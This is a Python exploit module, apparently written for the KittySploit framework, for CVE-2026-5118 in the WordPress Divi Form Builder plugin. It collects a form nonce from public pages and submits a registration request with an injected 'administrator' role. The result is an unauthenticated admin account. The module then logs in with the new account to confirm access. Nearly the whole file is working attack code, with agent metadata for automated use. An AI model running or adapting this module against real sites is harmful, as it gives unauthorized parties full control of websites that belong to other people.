#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-5118 — Divi Form Builder unauthenticated admin registration."""

import random
import re
import string
import time
from typing import Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "WordPress Divi Form Builder CVE-2026-5118 admin creation",
        "description": (
            "CVE-2026-5118: Divi Form Builder <= 5.1.2 accepts a client-supplied "
            "role on de_fb_ajax_submit_ajax_handler during registration. Harvests "
            "fb_nonce from the site, then POSTs multipart register with "
            "role=administrator to create an unauthenticated WordPress admin. "
            "Fixed in 5.1.3+."
        ),
        "author": ["0xd4rk5id3", "KittySploit Team"],
        "cve": ["CVE-2026-5118"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-5118",
            "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/divi-form-builder/divi-form-builder-512-unauthenticated-privilege-escalation-via-role",
            "https://diviengine.com/divi-form-builder-changelog/",
            "https://nefariousplan.com/posts/divi-form-builder-cve-2026-5118-administrator-existed",
        ],
        "tags": [
            "wordpress",
            "divi",
            "divi-form-builder",
            "privilege-escalation",
            "unauthenticated",
            "cwe-269",
            "cve-2026-5118",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "account_creation"],
            "expected_requests": 6,
            "reversible": False,
            "approval_required": True,
            "produces": ["credentials", "exploit_paths", "risk_signals"],
            "cost": 1.5,
            "noise": 0.55,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["wordpress", "divi"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/wp-admin/admin-ajax.php"],
                "param_any": ["fb_nonce", "role"],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "admin_access", "from_detail": "wordpress"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    _NONCE_RES = (
        re.compile(r'fb_nonce["\']?\s*[:=]\s*["\']([^"\']+)', re.I),
        re.compile(r'name=["\']fb_nonce["\'][^>]*value=["\']([^"\']+)', re.I),
        re.compile(r'de_fb_obj\s*=\s*\{[^}]*"fb_nonce"\s*:\s*"([a-f0-9]+)"', re.I),
        re.compile(r'"fb_nonce"\s*:\s*"([a-f0-9]+)"', re.I),
    )
    _SUCCESS = (
        "registration successful",
        "user_id",
        "user created",
        "registered",
        "account created",
        '"success":true',
        '"success": true',
    )

    path = OptString("/", "WordPress base path", required=False)
    username = OptString("", "Admin username (auto when empty)", required=False)
    password = OptString(
        "Attacker@123#+",
        "Password for the created administrator",
        required=False,
    )
    email = OptString("", "Email (auto when empty)", required=False)
    role = OptString("administrator", "Role injected into registration POST", required=False)
    page_path = OptString(
        "/",
        "Page that embeds a Divi Form Builder form (nonce source)",
        required=False,
    )
    verify_login = OptBool(
        True,
        "Verify new account via wp-login.php",
        required=False,
    )

    def _opt(self, option) -> str:
        if hasattr(option, "value"):
            return str(option.value or "").strip()
        return str(option or "").strip()

    def _base(self) -> str:
        return self.wp_normalize_base_path(self._opt(self.path) or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        if root == "/":
            return suffix
        return root.rstrip("/") + suffix

    def _timeout(self) -> int:
        return max(int(self.timeout or 15), 10)

    def _rand(self, n: int = 6) -> str:
        return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

    def _extract_nonce(self, html: str) -> Optional[str]:
        for pattern in self._NONCE_RES:
            match = pattern.search(html or "")
            if match:
                return match.group(1)
        # de_fb_obj multiline
        obj = re.search(r"de_fb_obj\s*=\s*(\{.*?\});", html or "", re.DOTALL)
        if obj:
            match = re.search(r'"fb_nonce"\s*:\s*"([^"]+)"', obj.group(1))
            if match:
                return match.group(1)
        return None

    def _harvest_nonce(self) -> Tuple[Optional[str], str]:
        candidates = []
        forced = self._opt(self.page_path) or "/"
        candidates.append(forced)
        for extra in ("/", "/register/", "/registration/", "/sign-up/", "/signup/"):
            if extra not in candidates:
                candidates.append(extra)

        for path in candidates:
            response = self.http_request(
                method="GET",
                path=self._join(path),
                allow_redirects=True,
                timeout=self._timeout(),
            )
            if not response or response.status_code != 200:
                continue
            nonce = self._extract_nonce(response.text or "")
            if nonce:
                return nonce, path
        return None, ""

    def _multipart(self, fields: dict) -> Tuple[str, str]:
        boundary = f"----WebKitFormBoundary{self._rand(16)}"
        lines = []
        for key, value in fields.items():
            lines.append(f"--{boundary}")
            lines.append(f'Content-Disposition: form-data; name="{key}"')
            lines.append("")
            lines.append(str(value))
        lines.append(f"--{boundary}--")
        lines.append("")
        return "\r\n".join(lines), boundary

    def _register(self, nonce: str, username: str, password: str, email: str):
        role = self._opt(self.role) or "administrator"
        fields = {
            "action": "de_fb_ajax_submit_ajax_handler",
            "fb_nonce": nonce,
            "role": role,
            "form_type": "register",
            "divi-form-submit": "yes",
            "de_fb_user_login": username,
            "user_login": username,
            "de_fb_user_pass": password,
            "user_pass": password,
            "de_fb_user_email": email,
            "user_email": email,
        }
        body, boundary = self._multipart(fields)
        return self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "X-Requested-With": "XMLHttpRequest",
            },
            data=body,
            allow_redirects=False,
            timeout=self._timeout(),
        )

    def _is_success(self, body: str) -> bool:
        lower = (body or "").lower()
        if any(s in lower for s in self._SUCCESS):
            # Avoid counting generic HTML "success" alone without context
            if "success" in lower and (
                "user" in lower
                or "regist" in lower
                or "user_id" in lower
                or '"success"' in lower
            ):
                return True
            if any(s in lower for s in self._SUCCESS if s != "success"):
                return True
        return False

    def _try_login(self, username: str, password: str) -> bool:
        response = self.http_request(
            method="POST",
            path=self._join("/wp-login.php"),
            data={
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": self._join("/wp-admin/"),
                "testcookie": "1",
            },
            allow_redirects=False,
            timeout=self._timeout(),
        )
        if not response:
            return False
        loc = (response.headers or {}).get("Location") or (response.headers or {}).get("location") or ""
        if response.status_code in (302, 303) and "wp-admin" in loc:
            return True
        cookies = getattr(response, "cookies", None)
        if cookies:
            names = {c.name for c in cookies}
            if any(n.startswith("wordpress_logged_in") for n in names):
                return True
        return False

    def check(self):
        nonce, page = self._harvest_nonce()
        if not nonce:
            return {
                "vulnerable": False,
                "reason": "fb_nonce not found",
                "confidence": "low",
            }
        return {
            "vulnerable": True,
            "reason": f"fb_nonce harvested from {page} (active check required for confirm)",
            "confidence": "medium",
            "nonce": nonce[:8] + "…",
        }

    def run(self):
        print_status("CVE-2026-5118 Divi Form Builder — admin registration")
        print_status("Harvesting fb_nonce…")
        nonce, page = self._harvest_nonce()
        if not nonce:
            print_error("fb_nonce not found — set page_path to a page with a DFB form")
            return False
        print_success(f"fb_nonce from {page}: {nonce[:12]}…")

        stamp = self._rand(5)
        username = self._opt(self.username) or f"ks_admin_{stamp}"
        password = self._opt(self.password) or f"Kx_Pwned_5118!{stamp}"
        email = self._opt(self.email) or f"{username}@example.com"

        print_status(f"Registering {username} as {self._opt(self.role) or 'administrator'}…")
        response = self._register(nonce, username, password, email)
        if not response:
            print_error("No response from admin-ajax.php")
            return False

        body = response.text or ""
        print_info(f"HTTP {response.status_code} ({len(body)}b)")
        ok = self._is_success(body)
        if not ok and response.status_code == 200 and "error" not in body.lower()[:200]:
            # Some installs return JSON without English strings
            if re.search(r'"user_id"\s*:\s*\d+', body) or re.search(
                r'"id"\s*:\s*\d+', body
            ):
                ok = True

        if not ok:
            print_error("Registration did not look successful")
            sample = re.sub(r"\s+", " ", body)[:240]
            if sample:
                print_info(sample)
            return False

        print_warning("Registration appears successful")
        print_success(f"Credentials: {username} / {password}")
        print_info(f"Email: {email}")
        print_info(f"wp-admin: {self._join('/wp-admin/')}")

        if self.verify_login:
            time.sleep(0.5)
            print_status("Verifying login…")
            if self._try_login(username, password):
                print_success("Login confirmed — administrator session obtained")
            else:
                print_info(
                    "Login not confirmed (may need activation email, or CAPTCHA). "
                    "Try credentials manually."
                )
        return True
